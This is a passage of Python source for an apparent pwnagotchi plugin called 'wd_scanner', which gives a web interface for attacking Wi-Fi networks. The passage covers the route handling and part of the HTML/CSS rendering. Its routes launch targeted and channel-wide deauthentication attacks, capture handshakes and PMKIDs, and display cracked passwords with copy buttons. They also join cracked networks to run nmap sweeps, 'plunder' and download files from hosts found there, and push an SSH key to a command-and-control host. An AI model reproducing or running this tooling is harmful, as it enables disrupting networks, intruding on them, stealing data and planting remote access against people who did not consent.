        if req.method == "POST" and norm == "scan":
            if not self._iface_cfg:
                self._select_error = "no aux radio selected"
                return redirect("/plugins/wd_scanner/")
            self._start_scan(req.form.get("seconds"))
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "deauth":
            bssid = (req.form.get("bssid") or "").strip()
            channel = (req.form.get("channel") or "").strip()
            ssid = (req.form.get("ssid") or "").strip()
            if not re.match(r"^[0-9a-fA-F:]{17}$", bssid) or not channel.isdigit():
                return abort(400)
            self._start_attack(bssid, channel, ssid)
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "shotgun":
            channel = (req.form.get("channel") or "").strip()
            if not channel.isdigit():
                return abort(400)
            self._start_shotgun(int(channel))
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "recon":
            ssid = (req.form.get("ssid") or "").strip()
            bssid = (req.form.get("bssid") or "").strip().lower()
            if not re.match(r"^[0-9a-f:]{17}$", bssid):
                return abort(400)
            cracked = self._load_cracked_index()
            password = (
                cracked.get(bssid)
                or cracked.get("ssid::" + ssid.lower())
            )
            if not password:
                self._select_error = "no password on file for %s" % (ssid or bssid)
                return redirect("/plugins/wd_scanner/")
            ok, msg = self._start_recon(ssid, bssid, password)
            if not ok:
                self._select_error = msg
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "recon/delete":
            # Delete a recon report.
            report_name = (req.form.get("report") or "").strip()
            if report_name and report_name.endswith(".json"):
                report_path = os.path.join(self._handshake_dir(), report_name)
                try:
                    if os.path.exists(report_path):
                        os.remove(report_path)
                except Exception:
                    pass
            return redirect("/plugins/wd_scanner/recon")

        if norm == "recon" or norm == "recon/":
            return self._render_recon_list()

        m_rep = re.match(r"^recon/([^/]+\.json)$", norm or "")
        if m_rep:
            rep = self._load_recon_report(m_rep.group(1))
            if rep is None:
                return abort(404)
            return self._render_recon_detail(m_rep.group(1), rep)

        # ---- plunder routes ----
        if req.method == "POST" and norm == "plunder":
            # Expects: bssid, ssid, targets (JSON array of {ip, ports})
            ssid = (req.form.get("ssid") or "").strip()
            bssid = (req.form.get("bssid") or "").strip().lower()
            if not re.match(r"^[0-9a-f:]{17}$", bssid):
                return abort(400)
            cracked = self._load_cracked_index()
            password = (
                cracked.get(bssid)
                or cracked.get("ssid::" + ssid.lower())
            )
            if not password:
                self._select_error = "no password on file for %s" % (ssid or bssid)
                return redirect("/plugins/wd_scanner/")
            targets_raw = req.form.get("targets") or "[]"
            try:
                targets = json.loads(targets_raw)
            except (ValueError, TypeError):
                return abort(400)
            self._start_plunder(ssid, bssid, password, targets)
            return redirect("/plugins/wd_scanner/plunder")

        if norm == "plunder" or norm == "plunder/":
            return self._render_plunder_list()

        m_loot = re.match(r"^plunder/([^/]+)/download/(.+)$", norm or "")
        if m_loot:
            job_dir_name = m_loot.group(1)
            file_rel = m_loot.group(2)
            job_path = os.path.join(self._plunder_dir(), job_dir_name)
            file_path = os.path.join(job_path, file_rel)
            # Safety: must be within the job dir.
            real_job = os.path.realpath(job_path)
            real_file = os.path.realpath(file_path)
            if not real_file.startswith(real_job + "/") or not os.path.isfile(real_file):
                return abort(404)
            from flask import send_file
            return send_file(real_file, as_attachment=True)

        m_plunder_detail = re.match(r"^plunder/([^/]+)/?$", norm or "")
        if m_plunder_detail:
            return self._render_plunder_detail(m_plunder_detail.group(1))

        if norm == "pwned" or norm == "pwned/":
            return self._render_pwned()

        if norm == "pwned.json":
            cracked = self._load_cracked_index()
            return jsonify(self._compact_pwned_list(cracked))

        if req.method == "POST" and norm == "check_update":
            self._maybe_run_update_check(force=True)
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "install_update":
            # Force a check-and-install even if auto-install is off.
            with self._update_lock:
                if self._update_in_flight:
                    return redirect("/plugins/wd_scanner/")
                self._update_in_flight = True

            def _run():
                try:
                    self._do_update_check(install=True)
                finally:
                    self._update_last_check = time.time()
                    with self._update_lock:
                        self._update_in_flight = False
            threading.Thread(target=_run, daemon=True).start()
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "restart_service":
            def _restart():
                import subprocess
                try:
                    subprocess.Popen(
                        ["systemctl", "restart", "pwnagotchi"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    )
                except Exception:
                    pass
            # Short delay so the HTTP response can be sent before the
            # service dies.
            threading.Timer(1.5, _restart).start()
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "dismiss_handshakes":
            self._new_handshakes = []
            self._handshake_toast_dismissed = time.time()
            return jsonify({"ok": True})

        if req.method == "POST" and norm == "set_note":
            bssid = (req.form.get("bssid") or "").strip()
            note = (req.form.get("note") or "").strip()
            if bssid:
                self._set_note(bssid, note)
            return jsonify({"ok": True})

        if req.method == "POST" and norm == "set_filter":
            self._filter_min_signal = int(req.form.get("min_signal", -100))
            self._filter_min_clients = int(req.form.get("min_clients", 0))
            sec_types = req.form.get("security", "")
            self._filter_security = [s.strip() for s in sec_types.split(",") if s.strip()]
            self._filter_hide_pwned = bool(req.form.get("hide_pwned", ""))
            return jsonify({"ok": True})

        if req.method == "POST" and norm == "toggle_pmkid":
            self._pmkid_attack_mode = not self._pmkid_attack_mode
            return jsonify({"enabled": self._pmkid_attack_mode})

        if req.method == "POST" and norm == "toggle_auto_attack":
            self._auto_attack = not self._auto_attack
            return jsonify({"enabled": self._auto_attack})

        if req.method == "POST" and norm == "toggle_debug":
            self._debug_enabled = not self._debug_enabled
            if self._debug_enabled:
                self._debug_log = []  # Clear log when enabling
                self._log_debug("DEBUG MODE ENABLED")
            return jsonify({"enabled": self._debug_enabled})

        if req.method == "POST" and norm == "export":
            bssid = (req.form.get("bssid") or "").strip()
            if not bssid:
                return jsonify({"ok": False, "error": "BSSID required"})
            archive = self._export_target_data(bssid)
            if archive:
                return jsonify({"ok": True, "file": archive})
            return jsonify({"ok": False, "error": "no data to export"})

        if req.method == "POST" and norm == "c2_upload":
            ssh_key = (req.form.get("ssh_key") or "").strip()
            target_bssid = (req.form.get("bssid") or "").strip() or None
            if not ssh_key:
                return jsonify({"ok": False, "error": "SSH key required"})
            ok, msg = self._start_c2_upload(ssh_key, target_bssid)
            return jsonify({"ok": ok, "message": msg})

        if norm == "status.json":
            return jsonify({
                "scan_running": self._scan_running,
                "scan_started_at": self._scan_started_at,
                "scan_error": self._last_scan_error,
                "results": self._last_scan_results,
                "action_running": self._action_running,
                "action_log": self._action_log[-50:],
                "recon_running": self._recon_running,
                "recon_log": self._recon_log[-50:],
                "plunder_running": self._plunder_running,
                "plunder_log": self._plunder_log[-50:],
                "c2_upload_running": self._c2_upload_running,
                "c2_upload_log": self._c2_upload_log[-50:],
                "c2_host": self._c2_host,
                "iface": self._iface_cfg,
                "mon_iface": self._mon_iface,
                "passive_iface": self._passive_iface_cfg,
                "passive_mon_iface": self._passive_mon_iface,
                "passive_running": self._passive_running,
                "passive_handshakes": self._passive_handshakes,
                "passive_log": self._passive_log[-50:],
                "available": self._list_wireless_ifaces(),
                "select_error": self._select_error,
                "pmkid_available": self._pmkid_available,
                "pmkid_enabled": self._pmkid_attack_mode,
                "auto_attack_enabled": self._auto_attack,
                "mac_random_enabled": self._mac_random_enabled,
                "debug_enabled": self._debug_enabled,
                "debug_log": self._debug_log[-100:] if self._debug_enabled else [],
                "filters": {
                    "min_signal": self._filter_min_signal,
                    "min_clients": self._filter_min_clients,
                    "security": self._filter_security,
                    "hide_pwned": self._filter_hide_pwned,
                },
                "version": self.__version__,
                "update": {
                    "url": self._update_url,
                    "in_flight": self._update_in_flight,
                    "last_check": self._update_last_check,
                    "last_status": self._update_last_status,
                    "remote_version": self._update_remote_version,
                    "remote_sha": self._update_remote_sha,
                    "local_sha": self._update_local_sha,
                    "auto_install": self._update_auto_install,
                    "pending_restart": self._update_pending_restart,
                },
                "new_handshakes": list(self._new_handshakes),
            })

        return self._render_index()

    # ---------------------------------------------------------- HTML rendering

    def _csrf_input(self):
        """
        Return a hidden CSRF token input that satisfies pwnagotchi's
        Flask-WTF CSRF protection. Falls back to an empty string if we
        are rendered outside an app context (e.g. unit tests / linting).
        """
        try:
            from flask_wtf.csrf import generate_csrf
            token = generate_csrf()
        except Exception:
            return ""
        return "<input type='hidden' name='csrf_token' value='%s'>" % escape(token)

    def _render_index(self):
        # Enumerate wireless devices fresh on every render so name changes
        # (e.g. wlan1 -> wlan2 after replug) are picked up automatically.
        available = self._list_wireless_ifaces()
        has_iface = bool(self._iface_cfg)
        csrf_input = self._csrf_input()

        # Build the picker dropdown.
        opt_lines = []
        seen_current = False
        for it in available:
            # Match both _iface_cfg and _mon_iface since airmon-ng may have
            # renamed the interface (e.g. wlan1 -> wlan1mon).
            is_cur = (it["name"] == self._iface_cfg or
                      (self._mon_iface and it["name"] == self._mon_iface))
            sel = " selected" if is_cur else ""
            if is_cur:
                seen_current = True
            shared_attr = " data-role='shared'" if it.get("shared") else ""
            tag = "shared" if it.get("shared") else it["type"]
            label = "%s  [%s]" % (it["name"], tag)
            if it.get("addr"):
                label += "  %s" % it["addr"]
            if is_cur and it["name"] != self._iface_cfg:
                # Show original name for clarity (e.g. "wlan1mon [monitor ← wlan1]")
                label = "%s  [monitor ← %s]" % (it["name"], self._iface_cfg)
            opt_lines.append(
                "<option value='{n}'{sel}{shared_attr}>{lbl}</option>".format(
                    n=escape(self._iface_cfg if is_cur else it["name"]),
                    sel=sel, shared_attr=shared_attr,
                    lbl=escape(label),
                )
            )
        # If the currently selected iface has vanished from the live list it's
        # usually because airmon-ng renamed it (wlan1 -> wlan1mon). Show the
        # monitor name so the user knows it's active, not "missing".
        if has_iface and not seen_current:
            if self._mon_iface and self._iface_exists(self._mon_iface):
                label = "%s  [monitor ← %s]" % (self._mon_iface, self._iface_cfg)
            else:
                label = "%s  [missing]" % self._iface_cfg
            opt_lines.insert(0, "<option value='{n}' selected>{lbl}</option>".format(
                n=escape(self._iface_cfg), lbl=escape(label)))
        if not opt_lines:
            opt_lines.append("<option value='' disabled selected>// no wireless devices //</option>")

        # Build passive monitor picker options (exclude main iface and active aux).
        main_iface = pwnagotchi_config_main_iface()
        passive_opt_lines = []
        passive_seen_current = False
        for it in available:
            # Skip interfaces already in use.
            if it["name"] == main_iface or it["name"] == self._iface_cfg or it["name"] == self._mon_iface:
                continue
            is_passive = (it["name"] == self._passive_iface_cfg or
                          (self._passive_mon_iface and it["name"] == self._passive_mon_iface))
            sel = " selected" if is_passive else ""
            if is_passive:
                passive_seen_current = True
            label = "%s  [%s]" % (it["name"], it["type"])
            if it.get("addr"):
                label += "  %s" % it["addr"]
            if is_passive and it["name"] != self._passive_iface_cfg:
                label = "%s  [monitor ← %s]" % (it["name"], self._passive_iface_cfg)
            passive_opt_lines.append(
                "<option value='{n}'{sel}>{lbl}</option>".format(
                    n=escape(it["name"]), sel=sel, lbl=escape(label)
                )
            )
        if self._passive_iface_cfg and not passive_seen_current:
            if self._passive_mon_iface:
                label = "%s  [monitor ← %s]" % (self._passive_mon_iface, self._passive_iface_cfg)
            else:
                label = "%s  [missing]" % self._passive_iface_cfg
            passive_opt_lines.insert(0, "<option value='{n}' selected>{lbl}</option>".format(
                n=escape(self._passive_iface_cfg), lbl=escape(label)))
        if not passive_opt_lines:
            passive_opt_lines.append("<option value='' disabled selected>// no available radios //</option>")

        select_err_html = ""
        if self._select_error:
            select_err_html = "<div class='err'>// %s</div>" % escape(self._select_error)

        shared_warn_html = ""
        if self._shared_radio:
            shared_warn_html = (
                "<div class='shared-warn'>"
                "<span>&#9888;</span>"
                "<span><b>SHARED RADIO</b> &mdash; pwnagotchi will pause "
                "while we scan or attack, then resume automatically.</span>"
                "</div>"
            )

        # ---- updater panel + restart banner ----
        update_panel_html, restart_banner_html = self._render_update_panel()

        # ---- shotgun panel: per-channel mass deauth ----
        channel_counts = {}
        for ap in (self._last_scan_results or []):
            ch = int(ap.get("channel") or 0)
            if ch <= 0:
                continue
            channel_counts[ch] = channel_counts.get(ch, 0) + 1
        if channel_counts:
            ordered = sorted(channel_counts.items(), key=lambda kv: kv[0])
            chip_html = []
            for ch, n in ordered:
                disabled = "disabled" if (
                    self._action_running or self._recon_running or not has_iface
                ) else ""
                chip_html.append(
                    "<form method='POST' action='/plugins/wd_scanner/shotgun' class='shot-chip-form'"
                    "      onsubmit=\"return confirm('// SHOTGUN ch{ch}\\n"
                    "Deauth all {n} BSSIDs on channel {ch} and listen 30s?');\">"
                    "  {csrf}"
                    "  <input type='hidden' name='channel' value='{ch}'>"
                    "  <button type='submit' class='shot-chip' {disabled}>"
                    "    CH {ch} <span class='shot-n'>{n}</span>"
                    "  </button>"
                    "</form>".format(ch=ch, n=n, disabled=disabled, csrf=csrf_input)
                )
            shotgun_panel_html = (
                "<div class='shotgun'>"
                "  <h3>shotgun by channel</h3>"
                "  <p class='shot-blurb'>deauth every BSSID on a channel + listen %ds</p>"
                "  <div class='shot-chips'>%s</div>"
                "</div>"
            ) % (self._shotgun_listen_seconds, "\n".join(chip_html))
        else:
            shotgun_panel_html = ""

        # ---- recon panel ----
        if self._recon_running or self._recon_log:
            recon_lines = "\n".join(escape(l) for l in self._recon_log[-50:])
            badge = "<span class='recon-state run'>RUNNING</span>" if self._recon_running \
                    else "<span class='recon-state idle'>IDLE</span>"
            recon_panel_html = (
                "<div class='section-h'>recon log</div>"
                "<div class='recon-panel'>"
                "  <div class='recon-h'>{badge}<a href='/plugins/wd_scanner/recon'>VIEW REPORTS &rarr;</a></div>"
                "  <pre class='log'>{lines}</pre>"
                "</div>"
            ).format(badge=badge, lines=recon_lines)
        else:
            recon_panel_html = ""

        # Look up any networks pwnagotchi has already cracked, so we can
        # surface the password and mark the card as PWNED.
        cracked = self._load_cracked_index()

        # Group APs by SSID for cleaner display when same network has
        # multiple BSSIDs (e.g. mesh / multi-AP setups).
        from collections import OrderedDict
        ssid_groups = OrderedDict()  # ssid_lower -> [ap, ...]
        for ap in self._last_scan_results:
            key = ap["ssid"].lower()
            ssid_groups.setdefault(key, []).append(ap)

        def _render_ap_card(ap, show_ssid_header=True, grouped=False):
            """Render a single AP card (or sub-card within a group)."""
            ssid_safe = escape(ap["ssid"])
            ssid_js = ssid_safe.replace("'", "").replace("\\", "")
            enc_raw = ap.get("encryption") or "OPN"
            pwr = ap["power"]
            if pwr >= -55:
                bars, bar_cls = 4, "s4"
            elif pwr >= -70:
                bars, bar_cls = 3, "s3"
            elif pwr >= -82:
                bars, bar_cls = 2, "s2"
            else:
                bars, bar_cls = 1, "s1"
            cl = ap["clients"]
            cl_cls = "hot" if cl >= 3 else ("warm" if cl >= 1 else "cold")

            password = (
                cracked.get(ap["bssid"].lower())
                or cracked.get("ssid::" + ap["ssid"].lower())
            )
            is_pwned = password is not None
            pwned_cls = " pwned" if is_pwned else ""
            badge = ""
            if is_pwned:
                badge = "<span class='badge-pwned' title='already cracked'>&#x2713; PWNED</span>"

            password_row = ""
            if is_pwned and not grouped:
                pw_safe = escape(password)
                password_row = (
                    "<div class='pw'>"
                    "<dt>PASSWORD</dt>"
                    "<dd><code class='pw-val'>{pw}</code>"
                    "<button type='button' class='copy' "
                    "data-pw='{pw_attr}' aria-label='copy password'>copy</button>"
                    "</dd>"
                    "</div>".format(
                        pw=pw_safe,
                        pw_attr=pw_safe.replace("&#x27;", "&apos;"),
                    )
                )

            # Note row.
            note = self._get_note(ap["bssid"])
            note_row = ""
            if not grouped:
                note_display = escape(note) if note else "<em style='color:var(--mute)'>tap to add note</em>"
                note_row = (
                    "<div class='note-row' data-bssid='{bssid}'>"
                    "<dt>NOTE</dt>"
                    "<dd class='note-text'>{note}</dd>"
                    "</div>".format(bssid=escape(ap["bssid"]), note=note_display)
                )

            hack_button_label = (
                "<span class='glyph'>&#x2713;</span> RE-CAPTURE"
                if is_pwned
                else "<span class='glyph'>&#x2620;</span> HACK / CAPTURE"
            )
            confirm_msg = (
                "// ALREADY PWNED\\nRe-capture handshake for\\n"
                if is_pwned
                else "// HACK TARGET\\n"
            )

            recon_btn = ""
            if is_pwned and not grouped:
                recon_btn = (
                    "  <form method='POST' action='/plugins/wd_scanner/recon' class='recon-form'"
                    "        onsubmit=\"return confirm('// RECON TARGET\\n{ssid_js}\\nConnect with known password and run nmap sweep?');\">"
                    "    {csrf}"
                    "    <input type='hidden' name='bssid' value='{bssid}'>"
                    "    <input type='hidden' name='ssid' value='{ssid}'>"
                    "    <button type='submit' class='btn-recon' {recon_disabled}>"
                    "      <span class='glyph'>&#x1f50d;</span> RECON"
                    "    </button>"
                    "  </form>"
                ).format(
                    ssid=ssid_safe,
                    ssid_js=ssid_js,
                    bssid=escape(ap["bssid"]),
                    csrf=csrf_input,
                    recon_disabled="disabled" if (
                        self._action_running or self._recon_running
                    ) else "",
                )

            cls_extra = pwned_cls + (" node-sub" if grouped else "")
            header_html = ""
            if show_ssid_header:
                header_html = (
                    "  <header class='node-h ssid-toggle' data-ssid-key='{ssid_key}'>"
                    "    <span class='collapse-arrow'>&#x25BC;</span>"
                    "    <span class='ssid'>{ssid}{badge}</span>"
                    "    <span class='sig {bar_cls}' aria-label='signal'>"
                    "      <i></i><i></i><i></i><i></i>"
                    "    </span>"
                    "  </header>"
                ).format(ssid=ssid_safe, badge=badge, bar_cls=bar_cls,
                         ssid_key=escape(ap["bssid"]))

            # Determine encryption CSS class.
            enc_upper = enc_raw.upper()
            if "WPA3" in enc_upper:
                enc_cls = "enc-wpa3"
            elif "WPA2" in enc_upper:
                enc_cls = "enc-wpa2"
            elif "WPA" in enc_upper:
                enc_cls = "enc-wpa"
            elif "WEP" in enc_upper:
                enc_cls = "enc-wep"
            elif "OPN" in enc_upper or enc_upper == "":
                enc_cls = "enc-open"
            else:
                enc_cls = "enc-wpa"

            return (
                "<article class='node{cls_extra}' data-ssid-key='{ssid_key}'>"
                "  {header_html}"
                "  <div class='node-body'>"
                "  <dl class='meta'>"
                "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
                "    <div><dt>CH</dt><dd>{ch}</dd></div>"
                "    <div><dt>PWR</dt><dd>{pwr} dBm</dd></div>"
                "    <div><dt>SEC</dt><dd class='{enc_cls}'>{enc}</dd></div>"
                "    <div><dt>NODES</dt><dd class='cl {cl_cls}'>{cl}</dd></div>"
                "    {password_row}"
                "  </dl>"
                "  {note_row}"
                "  <form method='POST' action='/plugins/wd_scanner/deauth' class='hack-form'"
                "        onsubmit=\"return confirm('{confirm}{ssid_js}\\nDeauth + capture?');\">"
                "    {csrf}"
                "    <input type='hidden' name='bssid' value='{bssid}'>"
                "    <input type='hidden' name='channel' value='{ch}'>"
                "    <input type='hidden' name='ssid' value='{ssid}'>"
                "    <button type='submit' class='btn-hack' {disabled}>"
                "      {label}"
                "    </button>"
                "  </form>"
                "  {recon_btn}"
                "  </div>"
                "</article>"
            ).format(
                cls_extra=cls_extra,
                header_html=header_html,
                ssid=ssid_safe,
                ssid_js=ssid_js,
                ssid_key=escape(ap["bssid"]),
                bssid=escape(ap["bssid"]),
                ch=ap["channel"],
                pwr=pwr,
                cl=cl,
                cl_cls=cl_cls,
                bar_cls=bar_cls,
                enc=escape(enc_raw),
                enc_cls=enc_cls,
                password_row=password_row,
                note_row=note_row,
                confirm=confirm_msg,
                label=hack_button_label,
                csrf=csrf_input,
                disabled="disabled" if (self._action_running or not has_iface or self._recon_running) else "",
                recon_btn=recon_btn,
            )

        # Build cards, grouping multi-BSSID SSIDs.
        cards = []
        for ssid_key, group in ssid_groups.items():
            if len(group) == 1:
                # Single BSSID — render normally.
                cards.append(_render_ap_card(group[0], show_ssid_header=True, grouped=False))
            else:
                # Multiple BSSIDs — group header + sub-cards.
                best_ap = group[0]  # already sorted by signal
                ssid_safe = escape(best_ap["ssid"])
                password = (
                    cracked.get(best_ap["bssid"].lower())
                    or cracked.get("ssid::" + best_ap["ssid"].lower())
                )
                is_pwned = password is not None
                pwned_cls = " pwned" if is_pwned else ""
                badge = ""
                if is_pwned:
                    badge = "<span class='badge-pwned' title='already cracked'>&#x2713; PWNED</span>"
                pw_row = ""
                if is_pwned:
                    pw_safe = escape(password)
                    pw_row = (
                        "<div class='pw'>"
                        "<dt>PASSWORD</dt>"
                        "<dd><code class='pw-val'>{pw}</code>"
                        "<button type='button' class='copy' "
                        "data-pw='{pw_attr}' aria-label='copy password'>copy</button>"
                        "</dd>"
                        "</div>".format(
                            pw=pw_safe,
                            pw_attr=pw_safe.replace("&#x27;", "&apos;"),
                        )
                    )
                recon_btn = ""
                if is_pwned:
                    ssid_js = ssid_safe.replace("'", "").replace("\\", "")
                    recon_btn = (
                        "  <form method='POST' action='/plugins/wd_scanner/recon' class='recon-form'"
                        "        onsubmit=\"return confirm('// RECON TARGET\\n{ssid_js}\\nConnect with known password and run nmap sweep?');\">"
                        "    {csrf}"
                        "    <input type='hidden' name='bssid' value='{bssid}'>"
                        "    <input type='hidden' name='ssid' value='{ssid}'>"
                        "    <button type='submit' class='btn-recon' {recon_disabled}>"
                        "      <span class='glyph'>&#x1f50d;</span> RECON"
                        "    </button>"
                        "  </form>"
                    ).format(
                        ssid=ssid_safe,
                        ssid_js=ssid_js,
                        bssid=escape(best_ap["bssid"]),
                        csrf=csrf_input,
                        recon_disabled="disabled" if (
                            self._action_running or self._recon_running
                        ) else "",
                    )

                total_clients = sum(a["clients"] for a in group)
                group_key = ssid_key  # use lowercase ssid as collapse key
                group_header = (
                    "<div class='node-group{pwned_cls}' data-ssid-key='{group_key}'>"
                    "  <header class='node-h ssid-toggle' data-ssid-key='{group_key}'>"
                    "    <span class='collapse-arrow'>&#x25BC;</span>"
                    "    <span class='ssid'>{ssid}{badge}</span>"
                    "    <span class='group-count'>{n} APs &middot; {cl} nodes</span>"
                    "  </header>"
                    "  <div class='node-body'>"
                    "  <dl class='meta'>{pw_row}</dl>"
                    "  {recon_btn}"
                    "  <div class='node-group-items'>"
                ).format(
                    ssid=ssid_safe, badge=badge, pwned_cls=pwned_cls,
                    n=len(group), cl=total_clients, pw_row=pw_row,
                    recon_btn=recon_btn, group_key=escape(group_key),
                )
                cards.append(group_header)
                for ap in group:
                    cards.append(_render_ap_card(ap, show_ssid_header=False, grouped=True))
                cards.append("  </div></div></div>")

        scan_state = "RUNNING" if self._scan_running else "IDLE"
        attack_state = "RUNNING" if self._action_running else "IDLE"
        action_log = "\n".join(escape(line) for line in self._action_log[-50:])
        empty_state = (
            "<div class='empty'>"
            "<div class='empty-glyph'>&#x2620;</div>"
            "<p>// NO NODES MAPPED</p>"
            "<small>tap SCAN to sweep the airspace</small>"
            "</div>"
        )

        body = """\
<!doctype html>
<html lang='en'>
<head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1, viewport-fit=cover'>
<meta name='theme-color' content='#0a0d10'>
<title>ctOS // wd_scanner</title>
<style>
:root {{
  --bg: #07090b;
  --bg-2: #0d1115;
  --panel: #111820;
  --grid: #1a232c;
  --fg: #d8e4ec;
  --mute: #6c7c89;
  --cyan: #00e5ff;
  --cyan-d: #00b8cc;
  --orange: #ff7a00;
  --red: #ff2d55;
  --green: #2bff88;
  --warn: #ffb300;
}}
* {{ box-sizing: border-box; }}
html, body {{ margin: 0; padding: 0; }}
body {{
  background:
    radial-gradient(1200px 600px at 50% -10%, rgba(0,229,255,.07), transparent 60%),
    repeating-linear-gradient(0deg, rgba(255,255,255,.015) 0 1px, transparent 1px 3px),
    var(--bg);
  color: var(--fg);
  font-family: ui-monospace, "JetBrains Mono", "Fira Code", Menlo, Consolas, monospace;
  font-size: 14px;
  line-height: 1.4;
  min-height: 100vh;
  padding: env(safe-area-inset-top) env(safe-area-inset-right)
           env(safe-area-inset-bottom) env(safe-area-inset-left);
  overflow-x: hidden;
}}
body::before {{
  /* scanline overlay */
  content: '';
  position: fixed; inset: 0; pointer-events: none; z-index: 50;
  background: repeating-linear-gradient(180deg,
              rgba(0,0,0,.18) 0 1px, transparent 1px 3px);
  mix-blend-mode: multiply;
}}
.wrap {{ max-width: 720px; margin: 0 auto; padding: 12px; }}

/* ---- top header ---- */
.brand {{
  display: flex; align-items: center; gap: 10px;
  padding: 10px 12px; margin-bottom: 10px;
  border: 1px solid var(--grid);
  background: linear-gradient(180deg, #0e141a, #0a0e12);
  clip-path: polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%);
}}
.brand .mark {{
  width: 28px; height: 28px; flex: 0 0 28px;
  display: grid; place-items: center;
  border: 1px solid var(--cyan);
  color: var(--cyan);
  font-weight: 700;
  text-shadow: 0 0 6px rgba(0,229,255,.6);
}}
.brand h1 {{
  margin: 0; font-size: 14px; letter-spacing: .25em;
  text-transform: uppercase; color: var(--fg);
}}
.brand h1 b {{ color: var(--orange); font-weight: 700; }}
.brand .sub {{
  margin-left: auto;
  font-size: 11px; color: var(--mute); letter-spacing: .2em;
}}

/* ---- status bar ---- */
.status {{
  display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
  margin-bottom: 10px;
}}
.chip {{
  display: flex; flex-direction: column; gap: 2px;
  padding: 8px 10px;
  border: 1px solid var(--grid);
  background: var(--panel);
  font-size: 11px;
  letter-spacing: .15em;
  text-transform: uppercase;
}}
.chip .k {{ color: var(--mute); }}
.chip .v {{ color: var(--fg); font-weight: 600; }}
.chip.run .v {{ color: var(--green); text-shadow: 0 0 6px rgba(43,255,136,.5); }}
.chip.busy .v {{ color: var(--orange); text-shadow: 0 0 6px rgba(255,122,0,.5); }}

/* ---- scan toolbar ---- */
.toolbar {{
  position: sticky; top: 0; z-index: 5;
  display: flex; gap: 8px; align-items: stretch;
  padding: 10px; margin: 0 -12px 12px;
  background: linear-gradient(180deg, rgba(7,9,11,.95), rgba(7,9,11,.7));
  backdrop-filter: blur(6px);
  border-bottom: 1px solid var(--grid);
}}
.toolbar form {{ display: flex; gap: 8px; flex: 1; }}
.scan-dur {{
  display: flex; align-items: stretch; flex: 0 0 auto;
}}
.toolbar input[type=number] {{
  flex: 0 0 60px;
  background: #05080a;
  border: 1px solid var(--grid);
  border-right: none;
  color: var(--cyan);
  padding: 0 8px;
  font: inherit;
  height: 44px;
  letter-spacing: .1em;
}}
.toolbar input[type=number]:focus {{
  outline: none; border-color: var(--cyan);
  box-shadow: 0 0 0 2px rgba(0,229,255,.2);
}}
.scan-dur-unit {{
  display: flex; align-items: center;
  background: var(--grid); color: var(--mute);
  padding: 0 8px; font-size: 11px;
  border: 1px solid var(--grid); border-left: none;
  letter-spacing: .05em; text-transform: uppercase;
}}
.btn {{
  appearance: none; -webkit-appearance: none;
  display: inline-flex; align-items: center; justify-content: center;
  gap: 8px;
  flex: 1;
  height: 44px;
  padding: 0 14px;
  font: inherit; font-weight: 700;
  letter-spacing: .2em; text-transform: uppercase;
  background: #06292e;
  color: var(--cyan);
  border: 1px solid var(--cyan-d);
  cursor: pointer;
  position: relative;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
  transition: background .12s, color .12s;
}}
.btn:hover {{ background: #093840; }}
.btn:active {{ transform: translateY(1px); }}
.btn[disabled] {{ opacity: .4; cursor: not-allowed; }}
.btn.alt {{ background: #2a1300; color: var(--orange); border-color: var(--orange); }}
.btn.alt:hover {{ background: #3a1c00; }}
.btn.danger {{ background: #1a0007; color: var(--red); border-color: var(--red); }}
.btn.danger:hover {{ background: #2a000c; }}

/* ---- iface picker ----
   Stacked layout: dropdown row, then a 50/50 grid for SELECT/RELEASE
   so the buttons are equal-width and never get squashed off the edge.
*/
.picker {{
  margin: 0 -12px 8px;
  padding: 10px;
  background: linear-gradient(180deg, #0a0e12, #07090b);
  border-bottom: 1px solid var(--grid);
  display: flex; flex-direction: column; gap: 8px;
}}
.picker form {{ margin: 0; }}
.picker .picker-select-row {{
  display: flex;
}}
.picker select {{
  flex: 1 1 auto;
  min-width: 0;
  width: 100%;
  appearance: none; -webkit-appearance: none;
  background: #05080a;
  color: var(--cyan);
  border: 1px solid var(--grid);
  height: 44px;
  padding: 0 32px 0 12px;
  font: inherit;
  letter-spacing: .08em;
  background-image: linear-gradient(45deg, transparent 50%, var(--cyan) 50%),
                    linear-gradient(135deg, var(--cyan) 50%, transparent 50%);
  background-position: calc(100% - 18px) 50%, calc(100% - 12px) 50%;
  background-size: 6px 6px, 6px 6px;
  background-repeat: no-repeat;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
}}
.picker select:focus {{
  outline: none; border-color: var(--cyan);
  box-shadow: 0 0 0 2px rgba(0,229,255,.2);
}}
.picker .picker-actions {{
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 8px;
}}
.picker .picker-actions form {{
  display: flex;
  margin: 0;
}}
.picker .picker-actions .btn {{
  flex: 1 1 auto;
  width: 100%;
  height: 44px;
  padding: 0 14px;
}}
.err {{
  margin: 0 0 10px;
  padding: 8px 10px;
  background: #1a0007;
  border: 1px solid var(--red);
  color: #ffb3c0;
  font-size: 12px; letter-spacing: .08em;
}}
.hint {{
  margin: 0 0 10px;
  padding: 8px 10px;
  background: #07171a;
  border: 1px dashed var(--cyan-d);
  color: var(--cyan);
  font-size: 12px; letter-spacing: .08em;
}}

/* ---- passive monitor picker ---- */
.passive-picker {{
  margin: 0 -12px 12px;
  padding: 10px;
  background: linear-gradient(180deg, #0a1207, #07090b);
  border-top: 1px solid var(--green);
  border-bottom: 1px solid var(--green);
  display: flex; flex-direction: column; gap: 8px;
}}
.passive-picker h3 {{
  margin: 0 0 4px;
  font-size: 13px; font-weight: 700;
  color: var(--green); letter-spacing: .2em;
  text-transform: uppercase;
}}
.passive-blurb {{
  margin: 0 0 8px;
  font-size: 11px; color: var(--mute);
